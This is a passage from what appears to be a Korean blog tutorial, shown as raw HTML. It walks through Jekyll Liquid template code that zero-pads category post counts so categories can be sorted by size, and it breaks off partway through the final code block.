&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; s &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; null &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같이 &lt;code class=&quot;language-text&quot;&gt;max_length&lt;/code&gt;에 padding을 몇개 넣어야 할지 계산하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; s &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; null &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; pad &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;minus&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; len &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; c &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token range operator&quot;&gt;..&lt;/span&gt;pad&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;prepend&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그리고, &lt;code class=&quot;language-text&quot;&gt;size&lt;/code&gt;에 &lt;strong&gt;0&lt;/strong&gt;을 추가해 준다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; s &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; split_char &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; null &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; pad &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;minus&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; len &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; c &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token range operator&quot;&gt;..&lt;/span&gt;pad&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;prepend&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; temp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; split_char &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; name &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; temp &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;마지막으로 만든 값을 배열에 저장하고, 정렬한다.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;categories&lt;/strong&gt;에는 &lt;code class=&quot;language-text&quot;&gt;[&quot;size&quot;, &quot;category&quot;]&lt;/code&gt;을 원소로 가지는 배열로 구성되어있다.&lt;/p&gt;
&lt;p&gt;최종적으로 다음과 같이 작성하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; split_char &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;#&apos;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; s &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; null &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; s &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; split_char &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; null &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; pad &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; max_length &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;minus&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; len &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; c &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token range operator&quot;&gt;..&lt;/span&gt;pad&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;prepend&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
